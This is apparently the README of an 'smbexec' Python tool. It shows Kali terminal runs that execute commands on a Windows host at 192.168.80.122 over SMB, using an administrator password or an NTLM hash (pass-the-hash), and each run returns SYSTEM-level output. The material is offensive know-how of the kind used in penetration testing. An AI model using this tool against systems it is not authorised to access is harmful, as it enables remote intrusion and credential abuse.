# smbexec

┌──(root㉿kali)-[~]
└─# python3 main.py                                                                            
help: smbexec.py <username> <password/hash> <target_ip> <command> [yes/no](password is hash type)
                                                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# python3 main.py administrator 123456 192.168.80.122 whoami                              
nt authority\system

                                                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# python3 main.py administrator 32ed87bdb5fdc5e9cba88547376818d4 192.168.80.122 'whoami' yes 
nt authority\system
